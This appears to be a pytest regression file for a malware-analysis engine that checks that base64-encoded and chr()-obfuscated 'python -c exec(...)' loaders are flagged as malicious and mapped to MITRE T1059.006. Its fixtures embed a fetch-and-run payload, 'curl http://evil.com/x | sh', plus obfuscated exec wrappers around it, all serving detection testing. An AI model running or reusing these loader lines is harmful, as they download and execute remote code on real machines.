"""Python -c "exec(...b64decode(...))" wrapper — regression tests.

Locks the fix for the production analyst report where a payload like

    python -c "exec(__import__('base64').b64decode(b'…').decode())"

was scoring 0/100 BENIGN with "No techniques matched". This is a top-3
observed loader pattern for Linux/Windows Python malware.
"""
from __future__ import annotations

import base64

import pytest

from engine.orchestrator import Orchestrator
from engine.models import AnalysisContext, Budget
from engine.registry import DecoderRegistry


@pytest.fixture(scope="module", autouse=True)
def _warm():
    _ = DecoderRegistry.all()
    yield


def _run(payload: str):
    ctx = AnalysisContext(budget=Budget(max_depth=20, wall_time_ms=10000))
    return Orchestrator(ctx).run(payload)


_INNER_SOURCE = b'import os,sys; os.system("curl http://evil.com/x | sh")'
_INNER_B64 = base64.b64encode(_INNER_SOURCE).decode()


@pytest.mark.parametrize("prefix", ["python", "python3", "python3.11"])
def test_python_dash_c_exec_b64_direct(prefix):
    p = f'{prefix} -c "exec(__import__(\'base64\').b64decode(b\'{_INNER_B64}\').decode())"'
    r = _run(p)
    assert r.findings.verdict in ("suspicious", "malicious"), \
        f"expected suspicious/malicious, got {r.findings.verdict} score={r.findings.risk_score}"
    assert "http://evil.com/x" in r.findings.iocs.urls
    ids = [s.decoder for s in r.trace]
    assert "extract-wrapper" in ids
    assert "base64-decode" in ids
    mitre_ids = {m.id for m in r.findings.mitre_techniques}
    assert "T1059.006" in mitre_ids, f"missing T1059.006 in {mitre_ids}"


def test_python_dash_c_exec_b64_chr_obfuscation():
    """chr(N)+chr(M) obfuscation of the 'base64' module string still gets caught."""
    # __import__(chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52)) = __import__('base64')
    p = (
        'python -c "exec(__import__(chr(98)+chr(97)+chr(115)+chr(101)+'
        f'chr(54)+chr(52)).b64decode(b\'{_INNER_B64}\').decode())"'
    )
    r = _run(p)
    assert r.findings.verdict in ("suspicious", "malicious")
    assert "http://evil.com/x" in r.findings.iocs.urls


def test_python_wrapper_emits_python_lolbas_and_tradecraft():
    p = f'python -c "exec(__import__(\'base64\').b64decode(b\'{_INNER_B64}\').decode())"'
    r = _run(p)
    bins = {h.binary for h in r.findings.lolbas}
    assert "python.exe" in bins
    flags = {t.flag for t in r.findings.tradecraft}
    assert "python-exec-b64" in flags


def test_python_exec_plain_string():
    """`python -c "exec('malicious code here')"` (no b64) should still trigger."""
    p = 'python -c "exec(\'import os; os.system(\\"curl http://bad.example.com/x\\")\')"'
    r = _run(p)
    ids = [s.decoder for s in r.trace]
    assert "extract-wrapper" in ids
    mitre_ids = {m.id for m in r.findings.mitre_techniques}
    assert "T1059.006" in mitre_ids


def test_bare_dash_c_exec_b64_after_shell_extraction():
    """When a higher wrapper (bash / cmd) already stripped the `python` prefix,
    the `-c "exec(...)"` residue must still be recognised."""
    p = f'-c "exec(__import__(\'base64\').b64decode(b\'{_INNER_B64}\').decode())"'
    r = _run(p)
    ids = [s.decoder for s in r.trace]
    assert "extract-wrapper" in ids
    assert "http://evil.com/x" in r.findings.iocs.urls
